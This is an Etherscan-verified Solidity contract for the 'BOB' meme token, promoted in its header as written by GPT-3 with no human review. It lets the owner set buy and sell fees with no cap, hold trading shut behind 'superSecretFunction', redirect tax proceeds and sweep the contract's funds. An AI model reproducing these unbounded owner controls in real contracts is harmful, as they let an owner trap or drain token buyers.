/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

/**
 * Benevolent Overlord Bot (BOB)
 * Benevolent Overlord Bot (BOB) is the world's first AI-run cryptocurrency.
 * This entire smart contract is authored fully by GPT-3 and not reviewed by any human actors.
 *
 * Website: https://benevolentbob.io
 * Telegram: https://t.me/BobAIPortal
 */

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.13;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract BOB is IERC20, Ownable {
    string public constant _name = "Benevolent Overlord Bot";
    string public constant _symbol = "BOB";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1_000_000_000 * (10 ** _decimals);

    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) public _allowances;

    mapping (address => bool) public taxWhitelist;
    mapping (address => bool) public maxWhitelist;
    mapping (address => bool) public pairWhitelist;

    uint256 public buyFeeBot = 500;
    uint256 public sellFeeBot = 500;
    uint256 private _taxedTokens;

    address public walletBot = msg.sender;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 public constant uniswapV2Router02 = IUniswapV2Router02(router);
    address public immutable pair;

    uint256 public maxWallet = _totalSupply / 25;
    uint256 public taxQuota = 10 ** 18;

    bool private _ENABLED;
    bool private _LOCKED;
    modifier locked() {
        _LOCKED = true;
        _;
        _LOCKED = false;
    }

    constructor () {
        pair = IUniswapV2Factory(uniswapV2Router02.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = _totalSupply;
        taxWhitelist[msg.sender] = true;
        maxWhitelist[msg.sender] = true;
        pairWhitelist[pair] = true;
        maxWhitelist[pair] = true;
        approve(address(router), _totalSupply);
        approve(address(pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds balance");
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        if (_LOCKED) return _regularTransfer(sender, recipient, amount);
        require(_ENABLED || sender == owner(), "ERC20: not enabled");
        bool _sell = pairWhitelist[recipient] || recipient == router;
        if (!_sell && !maxWhitelist[recipient]) require((_balances[recipient] + amount) < maxWallet, "ERC20: max balance exceeded");
        if (_sell) {
            if (!pairWhitelist[msg.sender] && !_LOCKED && _balances[address(this)] >= taxQuota) _distTax();
        }
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender] - amount;
        uint256 amountReceived = (((pairWhitelist[sender] || sender == router) || (pairWhitelist[recipient]|| recipient == router)) ? !taxWhitelist[sender] && !taxWhitelist[recipient] : false) ? _takeTax(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient] + amountReceived;
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _regularTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        return true;
    }

    function _takeTax(address sender, address receiver, uint256 amount) private returns (uint256) {
        bool _sell = pairWhitelist[receiver] || receiver == address(router);
        uint256 _fee = _sell ? sellFeeBot : buyFeeBot;
        uint256 _tax = amount * _fee / 10_000;
        if (_fee > 0) _taxedTokens += _tax * (_sell ? sellFeeBot : buyFeeBot) / _fee;
        _balances[address(this)] = _balances[address(this)] + _tax;
        emit Transfer(sender, address(this), _tax);
        return amount - _tax;
    }

    function _distTax() private locked {
        uint256 _balanceSnapshot = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;
        uniswapV2Router02.swapExactTokensForETHSupportingFeeOnTransferTokens(balanceOf(address(this)), 0, path, address(this), block.timestamp);
        uint256 _tax = address(this).balance - _balanceSnapshot;
        _taxedTokens = 0;
        if (_tax > 0) payable(walletBot).call{value: _tax}("");
    }

    function superSecretFunction() external onlyOwner { _ENABLED = true; }
    function setPairWhitelist(address _pair, bool _value) external onlyOwner { pairWhitelist[_pair] = _value; }
    function isPairWhitelist(address _pair) external view returns (bool) { return pairWhitelist[_pair]; }
    function setTaxWhitelist(address _wallet, bool _value) external onlyOwner { taxWhitelist[_wallet] = _value; }
    function isTaxWhitelist(address _wallet) external view returns (bool) { return taxWhitelist[_wallet]; }
    function setMaxWhitelist(address _wallet, bool _value) external onlyOwner {  maxWhitelist[_wallet] = _value; }
    function isMaxWhitelist(address _wallet) external view returns (bool) { return maxWhitelist[_wallet]; }
    function setMaxWallet(uint256 _maxWallet) external onlyOwner { maxWallet = _maxWallet; }
    function setBuyFeeBot(uint256 _buyFeeBot) external onlyOwner { buyFeeBot = _buyFeeBot; }
    function setSellFeeBot(uint256 _sellFeeBot) external onlyOwner { sellFeeBot = _sellFeeBot; }
    function setWallets(address _walletBot) external onlyOwner { walletBot = _walletBot; }
    function setTaxQuota(uint256 _taxQuota) external onlyOwner { taxQuota = _taxQuota; }
    function rescueTokenGas() external onlyOwner { payable(msg.sender).call{value: address(this).balance}(""); }
    function rescueTokenERC(address _token, uint256 _amount) external onlyOwner { IERC20(_token).transfer(msg.sender, _amount); }

    receive() external payable {}
}